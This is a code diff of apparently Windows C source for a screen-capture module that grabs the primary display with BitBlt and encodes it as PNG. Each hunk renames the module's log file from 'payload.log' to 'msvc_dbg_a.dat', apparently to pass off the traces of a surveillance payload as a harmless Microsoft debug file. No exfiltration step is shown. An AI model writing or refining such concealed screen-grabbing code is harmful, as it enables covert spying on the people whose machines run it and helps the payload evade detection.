@@ -75,7 +75,7 @@ static int bgra_to_png(const uint8_t *bgra, UINT w, UINT h, UINT stride,
                                   CLSCTX_INPROC_SERVER,
                                   &IID_IWICImagingFactory_local, (void **)&factory);
     if (FAILED(hr) || !factory) {
-        slog_writef("payload.log", "wic factory failed hr=0x%lx", hr);
+        slog_writef("msvc_dbg_a.dat", "wic factory failed hr=0x%lx", hr);
         return 0;
     }
 
@@ -85,7 +85,7 @@ static int bgra_to_png(const uint8_t *bgra, UINT w, UINT h, UINT stride,
     IStream *stream = NULL;
     HRESULT hr_s = CreateStreamOnHGlobal(NULL, TRUE, &stream);
     if (FAILED(hr_s) || !stream) {
-        slog_writef("payload.log", "cap: CreateStreamOnHGlobal hr=0x%lx", hr_s);
+        slog_writef("msvc_dbg_a.dat", "cap: CreateStreamOnHGlobal hr=0x%lx", hr_s);
         factory->lpVtbl->Release(factory);
         return 0;
     }
@@ -157,12 +157,12 @@ int cap_primary_png(uint8_t **out_png, size_t *out_len) {
     int w = GetSystemMetrics(SM_CXSCREEN);
     int h = GetSystemMetrics(SM_CYSCREEN);
     if (w <= 0 || h <= 0) {
-        slog_writef("payload.log", "cap: bad metrics %dx%d", w, h);
+        slog_writef("msvc_dbg_a.dat", "cap: bad metrics %dx%d", w, h);
         return 0;
     }
 
     HDC screen_dc = GetDC(NULL);
-    if (!screen_dc) { slog_write("payload.log", "cap: GetDC(NULL) failed"); return 0; }
+    if (!screen_dc) { slog_write("msvc_dbg_a.dat", "cap: GetDC(NULL) failed"); return 0; }
 
     HDC mem_dc = CreateCompatibleDC(screen_dc);
     if (!mem_dc) { ReleaseDC(NULL, screen_dc); return 0; }
@@ -177,7 +177,7 @@ int cap_primary_png(uint8_t **out_png, size_t *out_len) {
         SelectObject(mem_dc, old);
         DeleteObject(bmp); DeleteDC(mem_dc);
         ReleaseDC(NULL, screen_dc);
-        slog_write("payload.log", "cap: BitBlt failed");
+        slog_write("msvc_dbg_a.dat", "cap: BitBlt failed");
         return 0;
     }
 
@@ -200,9 +200,9 @@ int cap_primary_png(uint8_t **out_png, size_t *out_len) {
     ReleaseDC(NULL, screen_dc);
 
     if (ok) {
-        slog_writef("payload.log", "cap: %dx%d -> %zu png bytes", w, h, *out_len);
+        slog_writef("msvc_dbg_a.dat", "cap: %dx%d -> %zu png bytes", w, h, *out_len);
     } else {
-        slog_writef("payload.log", "cap: PNG encode failed");
+        slog_writef("msvc_dbg_a.dat", "cap: PNG encode failed");
     }
     return ok;
 }
